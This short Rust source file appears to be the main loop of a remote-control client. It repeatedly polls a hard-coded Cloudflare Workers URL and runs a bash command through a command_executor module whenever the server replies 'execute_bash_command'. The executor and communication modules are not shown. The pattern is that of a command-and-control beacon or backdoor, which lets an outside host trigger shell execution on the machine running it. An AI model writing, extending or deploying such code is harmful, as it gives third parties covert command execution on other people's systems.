mod command_executor;
mod worker_communication;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";

    loop {
        // Send data to the Worker
        let response = match worker_communication::send_data_request(&worker_url).await {
            Ok(response) => response,
            Err(e) => {
                println!("Error: {}", e);
                continue;
            }
        };

        // Check the response from the Worker
        if response == "execute_bash_command" {
            command_executor::execute_bash_command(true);
        } else {
            command_executor::execute_bash_command(false);
        }

        // Add more conditions or logic to handle different commands
    }
}